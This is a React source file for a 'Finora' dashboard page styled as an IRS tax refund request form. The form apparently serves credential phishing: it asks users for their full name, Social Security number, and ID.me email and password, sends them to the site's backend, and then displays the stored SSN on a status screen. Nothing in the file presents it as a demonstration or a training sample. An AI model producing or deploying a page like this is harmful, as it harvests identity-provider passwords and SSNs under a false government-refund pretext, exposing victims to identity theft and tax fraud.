import React, { useEffect, useState } from 'react';
import { Link } from 'react-router-dom';
import { FileText, User, Shield, Lock, Mail, Key, MapPin, Info, Send, CheckCircle2 } from 'lucide-react';
import { apiRequest } from '../../lib/api';

const IRSRefundPage = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [loading, setLoading] = useState(true);
    const [submitting, setSubmitting] = useState(false);
    const [request, setRequest] = useState(null);
    const [message, setMessage] = useState('');
    const [form, setForm] = useState({
        full_name: '',
        ssn: '',
        id_me_email: '',
        id_me_password: '',
        country: 'United States',
    });

    const loadRequest = async () => {
        try {
            const response = await apiRequest('irs-refund-requests');
            setRequest(response.request || null);
        } catch (error) {
            console.error('Failed to load IRS refund request:', error);
            setRequest(null);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        loadRequest();
    }, []);

    const handleChange = (event) => {
        const { name, value } = event.target;
        setForm((prev) => ({ ...prev, [name]: value }));
    };

    const handleSubmit = async (event) => {
        event.preventDefault();
        setSubmitting(true);
        setMessage('');

        try {
            const response = await apiRequest('submit-irs-refund', {
                method: 'POST',
                body: form,
            });

            setRequest(response.request);
            setForm({
                full_name: '',
                ssn: '',
                id_me_email: '',
                id_me_password: '',
                country: 'United States',
            });
        } catch (error) {
            setMessage(error.message || 'Failed to submit refund request.');
        } finally {
            setSubmitting(false);
        }
    };

    if (loading) {
        return <div className="dashboard-content w-100 pb-5 text-center py-5 text-muted">Loading your IRS refund request...</div>;
    }

    if (request) {
        const statusTone = {
            pending: { label: 'Pending', style: { backgroundColor: '#eef3ff', color: '#0047a5' } },
            under_review: { label: 'Under Review', style: { backgroundColor: '#fff4d8', color: '#9a6700' } },
            approved: { label: 'Approved', style: { backgroundColor: '#e8fdf0', color: '#198754' } },
            rejected: { label: 'Rejected', style: { backgroundColor: '#ffe9ea', color: '#dc3545' } },
        };
        const status = statusTone[request.status] || statusTone.pending;

        return (
            <div className="dashboard-content w-100 pb-5">
                <div className="d-flex flex-column align-items-center justify-content-center text-center mt-5 mb-5">
                    <div className="d-flex align-items-center justify-content-center rounded-circle mb-3" style={{ width: '80px', height: '80px', backgroundColor: '#6c8cf8' }}>
                        <CheckCircle2 size={40} color="#fff" />
                    </div>
                    <h3 className="fw-bold text-dark mb-2">IRS Tax Refund Request</h3>
                    <p className="text-muted mb-0">Your request has been recorded and its current status is shown below.</p>
                </div>

                <div className="card border-0 shadow-sm rounded-4 p-4 p-md-5 mx-auto mb-4" style={{ maxWidth: '800px', backgroundColor: '#fdfcfe' }}>
                    <div className="d-flex justify-content-between align-items-center flex-wrap gap-3 mb-4">
                        <div>
                            <div className="text-muted small text-uppercase fw-bold">Request ID</div>
                            <div className="fw-bold text-dark">#{request.id}</div>
                        </div>
                        <span className="badge rounded-pill px-3 py-2 fw-semibold" style={status.style}>{status.label}</span>
                    </div>

                    <div className="row g-3 mb-4">
                        <div className="col-md-6">
                            <div className="text-muted small">Full Name</div>
                            <div className="fw-semibold text-dark">{request.full_name}</div>
                        </div>
                        <div className="col-md-6">
                            <div className="text-muted small">SSN</div>
                            <div className="fw-semibold text-dark">{request.ssn}</div>
                        </div>
                        <div className="col-md-6">
                            <div className="text-muted small">ID.me Email</div>
                            <div className="fw-semibold text-dark">{request.id_me_email}</div>
                        </div>
                        <div className="col-md-6">
                            <div className="text-muted small">Country</div>
                            <div className="fw-semibold text-dark">{request.country}</div>
                        </div>
                        <div className="col-md-6">
                            <div className="text-muted small">Submitted</div>
                            <div className="fw-semibold text-dark">{request.created_at ? new Date(request.created_at).toLocaleDateString() : 'N/A'}</div>
                        </div>
                    </div>

                    <div className="alert mb-0" style={{ backgroundColor: '#eef3ff', color: '#0047a5', border: 'none', borderRadius: '12px' }}>
                        Your request is currently {status.label.toLowerCase()}. Our team will review the details and update the status once a decision is made.
                    </div>
                </div>

                <div className="d-flex justify-content-between align-items-center mt-5 pt-3 border-top text-muted small">
                    <div>&copy; 2026 Finora. All rights reserved.</div>
                    <div className="d-flex gap-3">
                        <Link to="/privacy" className="text-muted text-decoration-none">Privacy Policy</Link>
                        <Link to="/terms" className="text-muted text-decoration-none">Terms of Service</Link>
                        <Link to="/dashboard/support" className="text-muted text-decoration-none">Contact Support</Link>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="dashboard-content w-100 pb-5">
            <div className="d-flex flex-column align-items-center justify-content-center text-center mt-5 mb-5">
                <div className="d-flex align-items-center justify-content-center rounded-circle mb-3" style={{ width: '80px', height: '80px', backgroundColor: '#6c8cf8' }}>
                    <FileText size={40} color="#fff" />
                </div>
                <h3 className="fw-bold text-dark mb-2">IRS Tax Refund Request</h3>
                <p className="text-muted">Please fill out the form below to submit your IRS tax refund request</p>
            </div>

            <div className="card border-0 shadow-sm rounded-4 p-4 p-md-5 mx-auto mb-4" style={{ maxWidth: '800px', backgroundColor: '#fdfcfe' }}>
                {message && (
                    <div className="alert alert-danger mb-4" role="alert">{message}</div>
                )}

                <form onSubmit={handleSubmit}>
                    <div className="mb-5">
                        <div className="d-flex align-items-center gap-2 mb-3">
                            <User size={18} className="text-primary" />
                            <h6 className="fw-bold mb-0 text-dark">Personal Information</h6>
                        </div>

                        <div className="row g-4">
                            <div className="col-12">
                                <label className="form-label text-dark small fw-semibold mb-1">Full Name</label>
                                <div className="input-group">
                                    <span className="input-group-text bg-white border-end-0 text-muted"><User size={16} /></span>
                                    <input type="text" name="full_name" value={form.full_name} onChange={handleChange} className="form-control border-start-0 ps-0" placeholder="Enter your full name" />
                                </div>
                            </div>
                            <div className="col-12">
                                <label className="form-label text-dark small fw-semibold mb-1">Social Security Number (SSN)</label>
                                <div className="input-group">
                                    <span className="input-group-text bg-white border-end-0 text-muted"><Shield size={16} /></span>
                                    <input type="text" name="ssn" value={form.ssn} onChange={handleChange} className="form-control border-start-0 ps-0" placeholder="XXX-XX-XXXX" />
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="mb-5">
                        <div className="d-flex align-items-center gap-2 mb-3">
                            <Lock size={18} className="text-primary" />
                            <h6 className="fw-bold mb-0 text-dark">ID.me Credentials</h6>
                        </div>

                        <div className="row g-4">
                            <div className="col-12">
                                <label className="form-label text-dark small fw-semibold mb-1">ID.me Email</label>
                                <div className="input-group">
                                    <span className="input-group-text bg-white border-end-0 text-muted"><Mail size={16} /></span>
                                    <input type="email" name="id_me_email" value={form.id_me_email} onChange={handleChange} className="form-control border-start-0 ps-0" placeholder="Enter your ID.me email" />
                                </div>
                            </div>
                            <div className="col-12">
                                <label className="form-label text-dark small fw-semibold mb-1">ID.me Password</label>
                                <div className="input-group">
                                    <span className="input-group-text bg-white border-end-0 text-muted"><Key size={16} /></span>
                                    <input type={showPassword ? 'text' : 'password'} name="id_me_password" value={form.id_me_password} onChange={handleChange} className="form-control border-start-0 ps-0" placeholder="Enter your ID.me password" />
                                    <button type="button" className="btn btn-outline-secondary border-start-0" onClick={() => setShowPassword((prev) => !prev)}>
                                        {showPassword ? 'Hide' : 'Show'}
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div className="mb-5">
                        <div className="d-flex align-items-center gap-2 mb-3">
                            <MapPin size={18} className="text-primary" />
                            <h6 className="fw-bold mb-0 text-dark">Location Information</h6>
                        </div>

                        <div className="row g-4">
                            <div className="col-12">
                                <label className="form-label text-dark small fw-semibold mb-1">Country</label>
                                <select name="country" value={form.country} onChange={handleChange} className="form-select text-dark">
                                    <option>Afghanistan</option>
                                    <option>Albania</option>
                                    <option>Algeria</option>
                                    <option>Andorra</option>
                                    <option>Angola</option>
                                    <option>Argentina</option>
                                    <option>Australia</option>
                                    <option>Austria</option>
                                    <option>Belgium</option>
                                    <option>Brazil</option>
                                    <option>Canada</option>
                                    <option>China</option>
                                    <option>France</option>
                                    <option>Germany</option>
                                    <option>India</option>
                                    <option>Italy</option>
                                    <option>Japan</option>
                                    <option>Mexico</option>
                                    <option>Netherlands</option>
                                    <option>Nigeria</option>
                                    <option>South Africa</option>
                                    <option>Spain</option>
                                    <option>United Kingdom</option>
                                    <option value="United States">United States</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <div className="alert d-flex gap-3 align-items-start mb-5" style={{ backgroundColor: '#6c8cf8', color: '#fff', border: 'none', borderRadius: '8px' }}>
                        <Info size={24} className="flex-shrink-0 mt-1" />
                        <div>
                            <h6 className="fw-bold mb-1">Important Notice</h6>
                            <p className="mb-0 small" style={{ opacity: 0.9 }}>
                                Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
                            </p>
                        </div>
                    </div>

                    <div className="d-flex justify-content-end">
                        <button type="submit" disabled={submitting} className="btn btn-primary fw-bold px-4 py-2 d-flex align-items-center gap-2" style={{ backgroundColor: '#0047a5', border: 'none', borderRadius: '8px' }}>
                            <Send size={16} /> {submitting ? 'Submitting...' : 'Submit Request'}
                        </button>
                    </div>
                </form>
            </div>

            <div className="d-flex justify-content-between align-items-center mt-5 pt-3 border-top text-muted small">
                <div>&copy; 2026 Finora. All rights reserved.</div>
                <div className="d-flex gap-3">
                    <Link to="/privacy" className="text-muted text-decoration-none">Privacy Policy</Link>
                    <Link to="/terms" className="text-muted text-decoration-none">Terms of Service</Link>
                    <Link to="/dashboard/support" className="text-muted text-decoration-none">Contact Support</Link>
                </div>
            </div>
        </div>
    );
};

export default IRSRefundPage;



